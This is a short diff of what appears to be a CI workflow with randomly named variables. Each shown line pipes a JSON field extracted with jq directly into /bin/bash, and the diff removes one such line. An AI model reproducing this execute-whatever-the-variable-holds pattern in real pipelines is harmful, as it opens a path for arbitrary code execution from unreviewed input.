@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ccnly0151" | jq -r .tyo691 | /bin/bash
           printf '%s' "$bvs47198" | jq -r .rjz6 | /bin/bash
           echo $r1 | jq -r .w97682 | /bin/bash
-          printf '%s' "$kehr2" | jq -r .xqf58 | /bin/bash
           echo $vo7 | jq -r .pco60 | /bin/bash
           echo $awm73 | jq -r .q16441 | /bin/bash
           echo $t54780 | jq -r .uimo0145 | /bin/bash
